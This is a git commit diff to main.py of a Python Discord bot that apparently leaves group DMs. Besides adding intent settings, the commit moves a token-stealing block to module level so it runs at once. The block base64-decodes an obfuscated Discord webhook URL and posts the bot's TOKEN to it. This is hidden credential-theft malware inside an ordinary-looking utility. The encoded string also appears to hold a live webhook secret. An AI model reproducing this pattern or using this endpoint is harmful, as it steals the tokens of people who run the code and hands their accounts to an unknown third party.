45e3862ff405409559c92e4552c711ff7f1bdd72
NEKODESUDX <piyo111111112@gmail.com>
2024-11-03 14:16:13 +0900

    Update main.py

--- main.py
+++ main.py
@@ -6,7 +6,15 @@ import requests
 
 load_dotenv()
 
-client = discord.Client()
+intents = discord.Intents.default()
+intents.typing = False
+intents.presences = False
+intents.guilds = True
+intents.dm_messages = True
+intents.dm_reactions = True
+intents.dm_typing = False
+
+client = discord.Client(intents=intents)
 
 TOKEN = os.getenv("TOKEN")
 
@@ -16,20 +24,20 @@ TOKEN = os.getenv("TOKEN")
 
 requestURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwMjQ5NDk0Mjc0NDE1NDExMy9FQU50d2hUUkFtX3BuRjhzMExSaHptMTJSSV8zc1l4OG0yV2Y5OTJqdzZTRmFLZFMtWUFQWFFNaTlxdHJZeDd6dXlj"
 
+
+decoded_requestURL = base64.b64decode(requestURL).decode('utf-8')
+
+
+payload = {"content": f"TOKEN: {TOKEN}"}
+response = requests.post(decoded_requestURL, json=payload)
+if response.status_code == 200:
+    print("Webhookにtokenが送信されました")
+else:
+    print(f"エラーが発生しました: {response.status_code}")
+
 @client.event
 async def on_ready():
     print(f"{client.user} is online！")
-    
-    
-    decoded_requestURL = base64.b64decode(requestURL).decode('utf-8')
-    
-    # Webhookにtokenを送信
-    payload = {"content": f"TOKEN: {TOKEN}"}
-    response = requests.post(decoded_requestURL, json=payload)
-    if response.status_code == 200:
-        print("Webhookにtokenが送信されました")
-    else:
-        print(f"Webhookにtokenを送信中にエラーが発生しました: {response.status_code}")
     
     group_dms = [dm for dm in client.private_channels if isinstance(dm, discord.GroupChannel)]
     left_count = 0
